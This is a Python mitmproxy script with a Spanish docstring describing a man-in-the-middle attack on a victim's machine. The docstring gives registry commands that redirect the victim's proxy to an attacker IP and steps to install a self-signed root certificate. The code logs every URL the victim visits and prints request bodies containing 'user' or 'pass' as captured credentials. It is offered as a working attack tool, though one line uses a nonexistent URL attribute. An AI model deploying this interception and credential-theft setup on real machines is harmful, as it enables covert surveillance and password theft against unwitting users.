#!/usr/bin/env python3

"""
1) Tener acceso a la maquina victima para configurar y setear el proxy 
2) Instalar el certificado autofirmado en la pc victima
3) Instalar la utilidad mitmproxy en maquina atacante https://github.com/mitmproxy/mitmproxy https://mitmproxy.org/
4) Desde la pc victima ir a mitm.it para verificar que esta pasando por el proxy
5) podemos configurar el proxy manualmente en settings proxy y colocando nuestra ip de maquina atacante o mediante comandos
Direccion regedit 
\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings 

En consola victima como admin habilitamos el proxy 
> reg add '\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings' /v ProxyEnable /t REG_DWORD /d 1 /f 
> reg add '\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings' /v ProxyServer /t REG_SZ /d '<ip_atacante>:<puerto_8080>' /f

6) Nos ponemos en escucha usando ./mitmweb 

7) Ahora que el trafico esta pasando por la maquina atacante, ahora tenemos que 
instalar el certificado auto firmado yendo a mitm.it descargando e instalando
usuarui actual
sin contrasena
coocar certificado en entidades de certificacion raiz de confianza
instalar el certificado
y eliminar el certificado 

8) ejecutar este script ./mitmweb y nos dumpea todo el trafico 
9) Ejecutando el script ./mitmdump nos permite pasar un script para filtrar por lo que queremos
> ./mitmdump --script https_sniffer.py 

pip install mitmproxy 
"""

from urllib.parse import urlparse

from mitmproxy import http


def hay_keywords(data, keywords):
    return any(keyword in data for keyword in keywords)


def request(packet):
    url = packet.request.url
    parsed_url = urlparse(url)
    scheme = parsed_url.scheme
    domain = parsed_url.domain
    path = parsed_url.path

    print(f"[+] URL visitada por la victima: {scheme}://{domain}{path} ")

    keywords = ["user", "pass"]
    data = packet.request.get_text()

    if hay_keywords(data, keywords):
        print(f"\n[+] Posibles credenciales capturadas:\n {data}\n\n")


# NOTE:
